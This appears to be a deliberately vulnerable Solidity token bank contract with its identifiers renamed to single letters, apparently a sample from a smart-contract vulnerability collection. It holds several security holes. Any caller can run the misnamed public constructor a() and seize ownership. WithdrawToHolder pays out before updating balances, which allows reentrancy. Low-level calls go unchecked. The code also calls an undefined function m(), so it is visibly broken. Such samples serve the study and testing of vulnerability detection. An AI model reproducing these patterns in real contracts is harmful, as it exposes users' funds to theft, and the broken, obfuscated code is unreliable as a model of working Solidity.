// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract Ownable
{
    address e;
    address i = msg.sender;

    function c(address l)
    public
    d
    {
        e = l;
    }

    function b()
    public
    {
        if(msg.sender==e)
        {
            i=e;
        }
    }

    modifier d
    {
        if(i == msg.sender)_;
    }
}

contract Token is Ownable
{
    address i = msg.sender;
    function WithdrawToken(address k, uint256 h,address p)
    public
    d
    {
        k.call(bytes4(m("transfer(address,uint256)")),p,h);
    }
}

contract TokenBank is Token
{
    uint public MinDeposit;
    mapping (address => uint) public Holders;

     ///Constructor
    function a()
    public
    {
        i = msg.sender;
        MinDeposit = 1 ether;
    }

    function()
    payable
    {
        Deposit();
    }

    function Deposit()
    payable
    {
        if(msg.value>MinDeposit)
        {
            Holders[msg.sender]+=msg.value;
        }
    }

    function WitdrawTokenToHolder(address o,address g,uint f)
    public
    d
    {
        if(Holders[o]>0)
        {
            Holders[o]=0;
            WithdrawToken(g,f,o);
        }
    }

    function WithdrawToHolder(address j, uint n)
    public
    d
    payable
    {
        if(Holders[j]>0)
        {
            if(j.call.value(n)())
            {
                Holders[j]-=n;
            }
        }
    }
}